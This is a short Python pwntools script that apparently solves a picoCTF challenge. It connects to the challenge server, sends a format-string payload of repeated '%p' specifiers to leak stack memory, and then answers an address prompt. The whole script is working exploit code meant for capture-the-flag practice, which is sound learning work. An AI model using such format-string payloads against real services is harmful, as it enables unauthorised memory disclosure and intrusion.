from pwn import *

r = remote('amiable-citadel.picoctf.net', 52580)
print(r.recvuntil(b'Enter your name:'))
r.sendline(b'%p %p %p %p %p %p %p %p %p %p %p %p')
leak = r.recvline()
print("Leak:", leak)
print(r.recvuntil(b'ex => 0x12345:'))
r.sendline(b'0x0')
print(r.recvall(timeout=1))
